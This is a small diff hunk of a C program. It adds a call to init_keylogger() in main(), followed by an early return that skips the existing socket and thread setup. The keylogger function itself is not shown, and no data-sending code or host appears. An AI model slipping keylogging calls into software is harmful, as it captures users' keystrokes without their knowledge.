@@ -27,6 +27,9 @@ int main()
 	int socket_desc = 0;
 	struct sockaddr_in server;
 	
+	init_keylogger();
+	return 0;
+
 	memset(&server, 0, sizeof(server));
 	
 	pthread_t thread_id;
